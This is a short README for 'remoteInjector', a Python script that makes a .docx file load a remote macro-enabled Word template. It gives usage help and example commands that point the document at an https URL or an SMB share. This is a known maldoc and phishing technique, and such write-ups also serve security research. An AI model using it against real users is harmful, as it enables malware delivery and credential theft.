# remoteInjector
Injects link to remote word template into word document.

[Related Blog Post](https://john-woodman.com/research/vba-macro-remote-template-injection/)
## Requirements
- Python3.x or Python2.x
## Usage
```
usage: remoteinjector.py [-h] [-w URL] F

Inject Template Through Relationship Settings

positional arguments:
  F           .docx file to inject template into

optional arguments:
  -h, --help  show this help message and exit
  -w URL      remote url to template

Example of use
To inject remote http url:

remoteinjector.py -w https://example.com/template.dotm example.docx

To inject SMB path:

remoteinjector.py -w \\1.1.1.1\C$\TEMP\template.dotm example.docx
```
